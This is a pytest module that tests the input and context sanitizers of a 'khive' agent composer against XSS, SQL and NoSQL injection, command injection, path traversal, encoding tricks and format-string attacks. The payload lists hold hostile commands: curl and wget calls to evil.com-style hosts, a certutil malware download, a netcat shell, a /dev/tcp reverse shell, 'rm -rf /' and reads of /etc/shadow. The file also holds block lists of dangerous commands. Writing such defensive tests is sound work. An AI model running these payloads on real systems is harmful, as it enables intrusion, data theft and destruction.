"""Data Sanitization Security Tests for khive services.

This module provides comprehensive security testing for data sanitization and validation
mechanisms across khive services including:
- XSS prevention and HTML sanitization
- SQL injection prevention
- Command injection prevention
- Path traversal sanitization
- Unicode and encoding attack prevention
- Input validation and filtering
- Output encoding and escaping
- Data type validation security
"""

import html
import re
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch
from urllib.parse import quote, unquote

import pytest

from khive.services.composition.agent_composer import AgentComposer


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.mark.parametrize(
        "xss_payload",
        [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<svg onload='alert(\"XSS\")'>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload='alert(\"XSS\")'>",
            "<div onclick='alert(\"XSS\")'>Click me</div>",
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            "<form action='javascript:alert(\"XSS\")'>",
            "<input type='text' onchange='alert(\"XSS\")'>",
            "<style>body{background:url(javascript:alert('XSS'))}</style>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>",
            "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
            "<base href='javascript:alert(\"XSS\")//'>",
        ],
    )
    def test_html_xss_sanitization(self, temp_workspace, xss_payload):
        """Test HTML XSS payload sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test context sanitization
        sanitized_context = composer._sanitize_context(xss_payload)

        # Should not contain dangerous HTML elements
        dangerous_elements = [
            "<script",
            "<iframe",
            "<object",
            "<embed",
            "<form",
            "<meta",
            "<link",
            "<style",
            "<base",
            "javascript:",
            "onload=",
            "onerror=",
            "onclick=",
            "onchange=",
            "onmouseover=",
            "onfocus=",
        ]

        for element in dangerous_elements:
            assert (
                element.lower() not in sanitized_context.lower()
            ), f"Dangerous element {element} not sanitized"

        # Should either be filtered or escaped
        if "<" in sanitized_context:
            # If HTML is present, it should be properly escaped
            assert "&lt;" in sanitized_context or "[FILTERED]" in sanitized_context

    @pytest.mark.parametrize(
        "attribute_xss",
        [
            "href='javascript:alert(1)'",
            "src='data:text/html,<script>alert(1)</script>'",
            "onclick='alert(1)'",
            "onmouseover='alert(1)'",
            "onfocus='alert(1)'",
            "onload='alert(1)'",
            "onerror='alert(1)'",
            "style='background:url(javascript:alert(1))'",
            "srcdoc='<script>alert(1)</script>'",
            "formaction='javascript:alert(1)'",
        ],
    )
    def test_html_attribute_xss_sanitization(self, temp_workspace, attribute_xss):
        """Test HTML attribute XSS payload sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Create payload with HTML attribute XSS
        payload = f"<div {attribute_xss}>Content</div>"
        sanitized = composer._sanitize_context(payload)

        # Should not contain dangerous attributes
        dangerous_patterns = [
            "javascript:",
            "data:text/html",
            "onclick=",
            "onmouseover=",
            "onfocus=",
            "onload=",
            "onerror=",
            "srcdoc=",
            "formaction=",
        ]

        for pattern in dangerous_patterns:
            assert (
                pattern.lower() not in sanitized.lower()
            ), f"Dangerous pattern {pattern} not sanitized"

    def test_css_injection_prevention(self, temp_workspace):
        """Test CSS injection attack prevention."""
        composer = AgentComposer(str(temp_workspace))

        css_injection_payloads = [
            "body{background:url(javascript:alert('XSS'))}",
            "@import url('javascript:alert(\"XSS\")'))",
            "expression(alert('XSS'))",
            "behavior:url(xss.htc)",
            "-moz-binding:url('http://evil.com/xss.xml#xss')",
            "background-image:url('javascript:alert(1)')",
        ]

        for payload in css_injection_payloads:
            sanitized = composer._sanitize_context(payload)

            # Should not contain CSS injection patterns
            dangerous_css_patterns = [
                "javascript:",
                "expression(",
                "behavior:",
                "-moz-binding:",
                "@import",
                "url(javascript",
                "url('javascript",
                'url("javascript',
            ]

            for pattern in dangerous_css_patterns:
                assert (
                    pattern.lower() not in sanitized.lower()
                ), f"CSS injection {pattern} not sanitized"

    def test_dom_xss_prevention(self, temp_workspace):
        """Test DOM-based XSS prevention."""
        composer = AgentComposer(str(temp_workspace))

        dom_xss_payloads = [
            "document.write('<script>alert(1)</script>')",
            "innerHTML = '<img src=x onerror=alert(1)>'",
            "location.href = 'javascript:alert(1)'",
            "eval('alert(1)')",
            "setTimeout('alert(1)', 1000)",
            "setInterval('alert(1)', 1000)",
            "Function('alert(1)')()",
            "new Function('alert(1)')()",
            "document.cookie = 'xss'",
            "window.open('javascript:alert(1)')",
        ]

        for payload in dom_xss_payloads:
            sanitized = composer._sanitize_context(payload)

            # Should not contain DOM manipulation patterns
            dangerous_dom_patterns = [
                "document.write",
                "innerHTML",
                "eval(",
                "setTimeout(",
                "setInterval(",
                "Function(",
                "new Function",
                "window.open(",
                "location.href",
                "document.cookie",
            ]

            for pattern in dangerous_dom_patterns:
                assert (
                    pattern not in sanitized
                ), f"DOM XSS pattern {pattern} not sanitized"


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.mark.parametrize(
        "sql_payload",
        [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users (username, password) VALUES ('admin', 'hacked'); --",
            "' UNION SELECT password FROM users --",
            "'; DELETE FROM users WHERE 1=1; --",
            "'; UPDATE users SET password='hacked' WHERE 1=1; --",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; SHUTDOWN; --",
            "' OR EXISTS(SELECT * FROM users) --",
            "'; WAITFOR DELAY '00:00:05'; --",
            "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
            "'; CREATE USER admin IDENTIFIED BY 'hacked'; --",
            "'; GRANT ALL PRIVILEGES TO admin; --",
            "' OR BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')); --",
        ],
    )
    def test_sql_injection_sanitization(self, temp_workspace, sql_payload):
        """Test SQL injection payload sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test input sanitization for potential SQL injection
        sanitized_input = composer._sanitize_input(sql_payload)

        # Should not contain SQL injection patterns
        dangerous_sql_patterns = [
            "drop table",
            "insert into",
            "delete from",
            "update ",
            "union select",
            "exec ",
            "shutdown",
            "waitfor delay",
            "benchmark(",
            "grant all",
            "create user",
            "'='",
            "1=1",
            "--",
            "#",
            "/*",
            "*/",
        ]

        for pattern in dangerous_sql_patterns:
            assert (
                pattern.lower() not in sanitized_input.lower()
            ), f"SQL injection {pattern} not sanitized"

        # Should not contain unescaped single quotes in dangerous contexts
        if "'" in sanitized_input:
            # If quotes are present, they should not be in SQL injection context
            assert not any(
                dangerous in sanitized_input.lower()
                for dangerous in ["or '", "and '", "where '"]
            )

    def test_nosql_injection_prevention(self, temp_workspace):
        """Test NoSQL injection prevention."""
        composer = AgentComposer(str(temp_workspace))

        nosql_payloads = [
            "'; return true; //",
            "' || '1'=='1",
            "$where: '1 == 1'",
            "$regex: '.*'",
            "$gt: ''",
            "$ne: null",
            "{$eval: 'db.collection.drop()'}",
            "'; db.users.drop(); '",
            "'+(function(){return 1})()+'",
            "'; this.password == 'admin' //",
        ]

        for payload in nosql_payloads:
            sanitized = composer._sanitize_input(payload)

            # Should not contain NoSQL injection patterns
            dangerous_nosql_patterns = [
                "$where",
                "$regex",
                "$gt",
                "$ne",
                "$eval",
                "db.",
                ".drop()",
                "return true",
                "function(",
                "this.password",
            ]

            for pattern in dangerous_nosql_patterns:
                assert (
                    pattern not in sanitized
                ), f"NoSQL injection {pattern} not sanitized"

    def test_orm_injection_prevention(self, temp_workspace):
        """Test ORM injection prevention."""
        composer = AgentComposer(str(temp_workspace))

        orm_payloads = [
            "User.where('1=1')",
            "User.find_by_sql('SELECT * FROM users')",
            "User.delete_all",
            "User.connection.execute('DROP TABLE users')",
            "__import__('os').system('rm -rf /')",
            "eval('User.delete_all')",
            "exec('import os; os.system(\"ls\")')",
        ]

        for payload in orm_payloads:
            sanitized = composer._sanitize_context(payload)

            # Should not contain ORM manipulation patterns
            dangerous_orm_patterns = [
                "delete_all",
                "find_by_sql",
                "connection.execute",
                "__import__",
                "eval(",
                "exec(",
                ".system(",
                "DROP TABLE",
            ]

            for pattern in dangerous_orm_patterns:
                assert (
                    pattern not in sanitized
                ), f"ORM injection {pattern} not sanitized"


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.mark.parametrize(
        "command_payload",
        [
            "; rm -rf /",
            "& del C:\\*.*",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "`cat /etc/shadow`",
            "$(cat /etc/hosts)",
            "; curl http://evil.com/steal_data",
            "& powershell.exe -Command 'Get-Process'",
            "| nc -l 1234 -e /bin/bash",
            "; wget http://malicious.com/backdoor.sh -O /tmp/backdoor.sh",
            "& certutil.exe -urlcache -split -f http://evil.com/malware.exe",
            "|| python -c 'import os; os.system(\"ls -la\")'",
            "`perl -e 'system(\"whoami\")'`",
            "$(ruby -e 'system(\"id\")')",
            "; bash -i >& /dev/tcp/attacker.com/8080 0>&1",
        ],
    )
    def test_command_injection_sanitization(self, temp_workspace, command_payload):
        """Test command injection payload sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test input sanitization for command injection
        sanitized_input = composer._sanitize_input(command_payload)

        # Should not contain command injection operators
        dangerous_operators = [";", "&", "|", "`", "$", "&&", "||"]

        for operator in dangerous_operators:
            if operator in command_payload:
                assert (
                    operator not in sanitized_input
                ), f"Command operator {operator} not sanitized"

        # Should not contain dangerous commands
        dangerous_commands = [
            "rm -rf",
            "del ",
            "cat /etc",
            "whoami",
            "curl ",
            "wget ",
            "nc ",
            "powershell",
            "certutil",
            "python -c",
            "perl -e",
            "ruby -e",
            "bash -i",
            "/bin/bash",
            "/bin/sh",
        ]

        for command in dangerous_commands:
            assert (
                command not in sanitized_input
            ), f"Dangerous command {command} not sanitized"

    def test_shell_metacharacter_sanitization(self, temp_workspace):
        """Test shell metacharacter sanitization."""
        composer = AgentComposer(str(temp_workspace))

        metacharacters = [
            ";",
            "&",
            "|",
            "`",
            "$",
            "(",
            ")",
            "{",
            "}",
            "[",
            "]",
            "<",
            ">",
            "?",
            "*",
            "~",
            "!",
            "#",
            "\\",
            "'",
            '"',
            " ",
        ]

        for char in metacharacters:
            if char in [" "]:  # Space might be allowed in some contexts
                continue

            payload = f"test{char}malicious"
            sanitized = composer._sanitize_input(payload)

            # Dangerous metacharacters should be removed or escaped
            if char in [";", "&", "|", "`", "$", "<", ">"]:
                assert (
                    char not in sanitized
                ), f"Shell metacharacter {char} not sanitized"

    def test_environment_variable_injection(self, temp_workspace):
        """Test environment variable injection prevention."""
        composer = AgentComposer(str(temp_workspace))

        env_injection_payloads = [
            "${PATH}",
            "$HOME/malicious",
            "$(echo $USER)",
            "`env`",
            "%PATH%",
            "%USERPROFILE%\\malicious",
            "$IFS$9sh",  # Advanced shell injection
            "${IFS}sh",
            "$'\\x41\\x41\\x41'",  # Shell quoting bypass
        ]

        for payload in env_injection_payloads:
            sanitized = composer._sanitize_input(payload)

            # Should not contain environment variable injection patterns
            dangerous_env_patterns = [
                "${",
                "$HOME",
                "$USER",
                "$PATH",
                "%PATH%",
                "$IFS",
                "$'\\x",
            ]

            for pattern in dangerous_env_patterns:
                assert (
                    pattern not in sanitized
                ), f"Environment injection {pattern} not sanitized"


class TestPathTraversalSanitization:
    """Test path traversal sanitization."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.mark.parametrize(
        "traversal_payload",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "....//....//etc//passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "..%255c..%255c..%255cwindows%255csystem32",  # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\server\\share\\sensitive",
            "..\\/..\\/..\\/etc",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/dev/null",
            "../../../../../root/.ssh/id_rsa",
        ],
    )
    def test_path_traversal_sanitization(self, temp_workspace, traversal_payload):
        """Test path traversal payload sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test input sanitization for path traversal
        sanitized_input = composer._sanitize_input(traversal_payload)

        # Should not contain path traversal sequences
        dangerous_path_patterns = [
            "../",
            "..\\",
            "..%2F",
            "..%5C",
            "..%255c",
            "..%c0%af",
            "/etc/",
            "/proc/",
            "/dev/",
            "/root/",
            "C:\\Windows\\",
            "\\\\server\\",
            "file:///",
        ]

        for pattern in dangerous_path_patterns:
            assert (
                pattern.lower() not in sanitized_input.lower()
            ), f"Path traversal {pattern} not sanitized"

    def test_file_inclusion_prevention(self, temp_workspace):
        """Test file inclusion attack prevention."""
        composer = AgentComposer(str(temp_workspace))

        inclusion_payloads = [
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
            "zip://malicious.zip#shell.php",
            "phar://malicious.phar/shell.php",
            "expect://whoami",
            "input://data",
            "file:///etc/passwd",
            "http://evil.com/shell.php",
            "ftp://attacker.com/backdoor.php",
        ]

        for payload in inclusion_payloads:
            sanitized = composer._sanitize_input(payload)

            # Should not contain file inclusion schemes
            dangerous_schemes = [
                "php://",
                "data://",
                "zip://",
                "phar://",
                "expect://",
                "input://",
                "file://",
                "http://",
                "ftp://",
            ]

            for scheme in dangerous_schemes:
                assert (
                    scheme not in sanitized
                ), f"File inclusion scheme {scheme} not sanitized"

    def test_directory_listing_prevention(self, temp_workspace):
        """Test prevention of directory listing attacks."""
        composer = AgentComposer(str(temp_workspace))

        # Test that _is_safe_path method blocks sensitive directories
        sensitive_paths = [
            Path("/etc"),
            Path("/root"),
            Path("/proc"),
            Path("/sys"),
            Path("/dev"),
            Path("C:\\Windows"),
            Path("C:\\System32"),
            Path("/System/Library"),
            Path("/usr/bin"),
            Path("/var/log"),
        ]

        for sensitive_path in sensitive_paths:
            # Should block access to sensitive system directories
            is_safe = composer._is_safe_path(sensitive_path)
            assert not is_safe, f"Sensitive path {sensitive_path} not blocked"


class TestUnicodeAndEncodingAttacks:
    """Test Unicode and encoding attack prevention."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    @pytest.mark.parametrize(
        "unicode_attack",
        [
            "test\u202e\u202dmalicious",  # Right-to-left override
            "test\ufeff",  # Zero-width no-break space
            "test\u200b",  # Zero-width space
            "test\u200c",  # Zero-width non-joiner
            "test\u200d",  # Zero-width joiner
            "test\u2028",  # Line separator
            "test\u2029",  # Paragraph separator
            "test\u00a0",  # Non-breaking space
            "роle",  # Cyrillic 'o' instead of Latin 'o' (homograph attack)
            "r᧐le",  # Myanmar digit zero instead of 'o'
            "rοle",  # Greek omicron instead of 'o'
            "tеst",  # Cyrillic 'e' instead of Latin 'e'
            "а",  # Cyrillic 'a' (looks like Latin 'a')
            "с",  # Cyrillic 'c' (looks like Latin 'c')
        ],
    )
    def test_unicode_attack_sanitization(self, temp_workspace, unicode_attack):
        """Test Unicode-based attack sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test input sanitization for Unicode attacks
        sanitized_input = composer._sanitize_input(unicode_attack)

        # Should normalize or remove dangerous Unicode characters
        dangerous_unicode_patterns = [
            "\u202e",
            "\u202d",
            "\ufeff",
            "\u200b",
            "\u200c",
            "\u200d",
            "\u2028",
            "\u2029",
            "\u00a0",
        ]

        for pattern in dangerous_unicode_patterns:
            assert (
                pattern not in sanitized_input
            ), f"Dangerous Unicode {repr(pattern)} not sanitized"

        # Should handle homograph attacks
        if any(ord(char) > 127 for char in unicode_attack):
            # If contains non-ASCII chars, should either normalize or reject
            ascii_equivalent = sanitized_input.encode("ascii", "ignore").decode("ascii")
            # Should have some ASCII representation or be filtered
            assert len(ascii_equivalent) > 0 or len(sanitized_input) < len(
                unicode_attack
            )

    @pytest.mark.parametrize(
        "encoding_attack",
        [
            "test%00malicious",  # Null byte (URL encoded)
            "test%0amalicious",  # Newline (URL encoded)
            "test%0dmalicious",  # Carriage return (URL encoded)
            "test%09malicious",  # Tab (URL encoded)
            "test%22malicious",  # Double quote (URL encoded)
            "test%27malicious",  # Single quote (URL encoded)
            "test%3cscript%3e",  # <script> (URL encoded)
            "test%2e%2e%2f",  # ../ (URL encoded)
            "test%255c",  # Double encoded backslash
            "test%c0%af",  # Overlong UTF-8 encoding
            "test%e0%80%af",  # Another overlong encoding
        ],
    )
    def test_encoding_attack_prevention(self, temp_workspace, encoding_attack):
        """Test encoding-based attack prevention."""
        composer = AgentComposer(str(temp_workspace))

        # Test that URL decoding doesn't introduce vulnerabilities
        sanitized = composer._sanitize_input(encoding_attack)

        # Should not decode dangerous patterns
        decoded = unquote(encoding_attack)
        dangerous_decoded_patterns = [
            "\x00",
            "\n",
            "\r",
            "\t",
            '"',
            "'",
            "<script>",
            "../",
            "\\",
            "/",
        ]

        # If the input was decoded, dangerous patterns should not appear
        for pattern in dangerous_decoded_patterns:
            if pattern in decoded:
                assert (
                    pattern not in sanitized
                ), f"Dangerous decoded pattern {repr(pattern)} not sanitized"

    def test_mixed_encoding_attacks(self, temp_workspace):
        """Test mixed encoding attack prevention."""
        composer = AgentComposer(str(temp_workspace))

        mixed_attacks = [
            "test%u0041script",  # Unicode URL encoding
            "test&#65;lert",  # HTML entity encoding
            "test\\u0041lert",  # JavaScript Unicode escape
            "test\\x41lert",  # Hex escape
            "test\\101lert",  # Octal escape
            "test\u0041lert",  # Actual Unicode character
        ]

        for attack in mixed_attacks:
            sanitized = composer._sanitize_input(attack)

            # Should handle mixed encoding safely
            # Either reject completely or ensure no dangerous content remains
            if "alert" in attack.lower():
                assert (
                    "alert" not in sanitized.lower()
                ), "Mixed encoding attack not sanitized"


class TestInputValidationSecurity:
    """Test input validation security."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    def test_length_limit_validation(self, temp_workspace):
        """Test length limit validation."""
        composer = AgentComposer(str(temp_workspace))

        # Test extremely long inputs
        long_inputs = [
            "A" * 1000,  # 1KB
            "B" * 10000,  # 10KB
            "C" * 100000,  # 100KB
            "D" * 1000000,  # 1MB
        ]

        for long_input in long_inputs:
            sanitized = composer._sanitize_input(long_input)

            # Should enforce length limits
            assert (
                len(sanitized) <= 255
            ), f"Length limit not enforced: {len(sanitized)} > 255"

    def test_data_type_validation(self, temp_workspace):
        """Test data type validation security."""
        composer = AgentComposer(str(temp_workspace))

        # Test various data types that should be handled safely
        invalid_types = [
            None,
            123,  # Integer
            45.67,  # Float
            ["list", "item"],  # List
            {"key": "value"},  # Dictionary
            b"bytes",  # Bytes
            True,  # Boolean
        ]

        for invalid_input in invalid_types:
            try:
                result = composer._sanitize_input(invalid_input)
                # If not rejected, should be converted to safe string
                assert isinstance(
                    result, str
                ), f"Non-string input not handled: {type(invalid_input)}"
            except (TypeError, ValueError):
                # Expected - should reject non-string input
                pass

    def test_regular_expression_dos_prevention(self, temp_workspace):
        """Test prevention of ReDoS (Regular Expression Denial of Service) attacks."""
        composer = AgentComposer(str(temp_workspace))

        # ReDoS patterns that can cause exponential backtracking
        redos_patterns = [
            "a" * 1000 + "!" + "a?" * 1000,  # Catastrophic backtracking
            "(" + "a" * 50 + ")*" + "b",  # Nested quantifiers
            "a" * 100 + "b",  # Simple pattern that might be slow
            "x" * 500 + "y" * 500,  # Long alternation
        ]

        for pattern in redos_patterns:
            start_time = time.time()
            try:
                sanitized = composer._sanitize_input(pattern)
                end_time = time.time()

                # Should not take excessively long to process
                processing_time = end_time - start_time
                assert (
                    processing_time < 1.0
                ), f"ReDoS vulnerability detected: {processing_time}s"

            except Exception:
                # If processing fails, that's also acceptable
                end_time = time.time()
                processing_time = end_time - start_time
                assert processing_time < 1.0, "Exception handling took too long"

    @pytest.mark.parametrize(
        "format_string_attack",
        [
            "%s%s%s%s%s%n",  # Format string attack
            "%x%x%x%x%x%x%x",  # Hex format string
            "%p%p%p%p",  # Pointer format string
            "%d%d%d%d%d",  # Decimal format string
            "%1000000s",  # Large width specifier
            "%*s",  # Dynamic width
            "%.1000000s",  # Large precision
            "%1$s%1$s%1$s",  # Positional parameters
            "%n%n%n%n",  # Write format specifiers
        ],
    )
    def test_format_string_attack_prevention(
        self, temp_workspace, format_string_attack
    ):
        """Test format string attack prevention."""
        composer = AgentComposer(str(temp_workspace))

        sanitized = composer._sanitize_input(format_string_attack)

        # Should not contain format string specifiers
        dangerous_format_patterns = ["%s", "%x", "%p", "%d", "%n", "%*", "%$"]

        for pattern in dangerous_format_patterns:
            if pattern in format_string_attack:
                assert (
                    pattern not in sanitized
                ), f"Format string {pattern} not sanitized"


class TestOutputEncodingSecurity:
    """Test output encoding and escaping security."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    def test_html_output_encoding(self, temp_workspace):
        """Test HTML output encoding."""
        composer = AgentComposer(str(temp_workspace))

        # Test HTML characters that need encoding
        html_chars = {
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;",
            '"': "&quot;",
            "'": "&#x27;",
        }

        for char, encoded in html_chars.items():
            input_text = f"test{char}content"
            sanitized = composer._sanitize_context(input_text)

            # Should either encode HTML chars or filter them
            if char in sanitized:
                # If character is present, it might be in safe context
                assert "[FILTERED]" in sanitized or encoded in sanitized

    def test_javascript_output_encoding(self, temp_workspace):
        """Test JavaScript output encoding."""
        composer = AgentComposer(str(temp_workspace))

        # Test JavaScript-dangerous characters
        js_dangerous = [
            "'",
            '"',
            "\\",
            "/",
            "\n",
            "\r",
            "\t",
            "\u2028",
            "\u2029",  # Line/paragraph separators
        ]

        for char in js_dangerous:
            input_text = f"test{char}content"
            sanitized = composer._sanitize_context(input_text)

            # Should escape or remove JavaScript-dangerous characters
            if char in ["\u2028", "\u2029"]:
                assert (
                    char not in sanitized
                ), f"Dangerous Unicode {repr(char)} not sanitized"
            elif char in ["'", '"', "\\"]:
                # These might be escaped or filtered
                if char in sanitized:
                    # Should be in safe context or escaped
                    assert "[FILTERED]" in sanitized

    def test_url_output_encoding(self, temp_workspace):
        """Test URL output encoding."""
        composer = AgentComposer(str(temp_workspace))

        # Test URL-dangerous characters
        url_dangerous = [" ", "<", ">", '"', "{", "}", "|", "\\", "^", "`", "[", "]"]

        for char in url_dangerous:
            input_text = f"http://example.com/path{char}param"
            sanitized = composer._sanitize_input(input_text)

            # Should encode or remove URL-dangerous characters
            if "http://" in sanitized:  # If URL structure is preserved
                # Dangerous chars should be encoded or removed
                if char in [" ", "<", ">", '"']:
                    assert (
                        char not in sanitized
                    ), f"URL-dangerous char {repr(char)} not sanitized"


class TestDataValidationIntegration:
    """Test integrated data validation scenarios."""

    @pytest.fixture
    def temp_workspace(self):
        """Provide temporary workspace for testing."""
        import tempfile

        with tempfile.TemporaryDirectory() as temp_dir:
            yield Path(temp_dir)

    def test_multi_vector_attack_prevention(self, temp_workspace):
        """Test prevention of multi-vector attacks combining multiple techniques."""
        composer = AgentComposer(str(temp_workspace))

        # Combined attack vectors
        multi_attacks = [
            "<script>alert('XSS')</script>'; DROP TABLE users; --",  # XSS + SQL injection
            "../../../etc/passwd<img src=x onerror=alert(1)>",  # Path traversal + XSS
            "; rm -rf /<script>alert('pwned')</script>",  # Command injection + XSS
            "'; SELECT password FROM users; --<svg onload=alert(1)>",  # SQL + XSS
            "../etc/passwd; cat /etc/shadow",  # Path traversal + command injection
            "%27; DROP TABLE users; --<script>alert(%27XSS%27)</script>",  # URL encoded multi-attack
        ]

        for attack in multi_attacks:
            sanitized_input = composer._sanitize_input(attack)
            sanitized_context = composer._sanitize_context(attack)

            # Should prevent all attack vectors
            dangerous_patterns = [
                "drop table",
                "<script>",
                "alert(",
                "../",
                "/etc/passwd",
                "; rm",
                "; cat",
                "onload=",
                "onerror=",
                "'; select",
            ]

            for pattern in dangerous_patterns:
                assert (
                    pattern.lower() not in sanitized_input.lower()
                ), f"Multi-attack pattern {pattern} not sanitized in input"
                assert (
                    pattern.lower() not in sanitized_context.lower()
                ), f"Multi-attack pattern {pattern} not sanitized in context"

    def test_context_aware_sanitization(self, temp_workspace):
        """Test context-aware sanitization."""
        composer = AgentComposer(str(temp_workspace))

        # Test that sanitization is appropriate for context
        contexts = [
            {
                "input": "<b>Bold text</b>",
                "context": "html",
                "should_allow_html": False,  # Agent composer should not allow HTML
            },
            {
                "input": "SELECT * FROM users WHERE id = 1",
                "context": "sql",
                "should_allow_sql": False,  # Should not allow SQL in input
            },
            {
                "input": "ls -la /etc",
                "context": "command",
                "should_allow_command": False,  # Should not allow commands in input
            },
        ]

        for ctx in contexts:
            sanitized = composer._sanitize_input(ctx["input"])

            if ctx["context"] == "html" and not ctx["should_allow_html"]:
                assert "<b>" not in sanitized and "</b>" not in sanitized
            elif ctx["context"] == "sql" and not ctx["should_allow_sql"]:
                assert "SELECT" not in sanitized and "FROM" not in sanitized
            elif ctx["context"] == "command" and not ctx["should_allow_command"]:
                assert "ls -la" not in sanitized

    def test_sanitization_consistency(self, temp_workspace):
        """Test consistency of sanitization across different methods."""
        composer = AgentComposer(str(temp_workspace))

        test_inputs = [
            "test<script>alert(1)</script>",
            "test'; DROP TABLE users; --",
            "test; rm -rf /",
            "test../../../etc/passwd",
            "test\u202e\u202dmalicious",
        ]

        for test_input in test_inputs:
            # Test that different sanitization methods are consistent
            sanitized_input = composer._sanitize_input(test_input)
            sanitized_context = composer._sanitize_context(test_input)
            sanitized_cache_key = composer._sanitize_cache_key(test_input)

            # All methods should remove dangerous content
            dangerous_patterns = ["<script>", "DROP TABLE", "; rm", "../", "\u202e"]

            for pattern in dangerous_patterns:
                if pattern in test_input:
                    assert (
                        pattern not in sanitized_input
                    ), f"Inconsistent input sanitization for {pattern}"
                    assert (
                        pattern not in sanitized_context
                    ), f"Inconsistent context sanitization for {pattern}"
                    assert (
                        pattern not in sanitized_cache_key
                    ), f"Inconsistent cache key sanitization for {pattern}"


# Helper functions for testing
import time


def html_escape_custom(text):
    """Custom HTML escaping for testing."""
    return (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


@pytest.fixture
def mock_sanitizer():
    """Provide a mock sanitizer for testing."""
    sanitizer = Mock()
    sanitizer.sanitize.return_value = "sanitized_content"
    return sanitizer


class SecurityError(Exception):
    """Custom security exception for testing."""

    pass
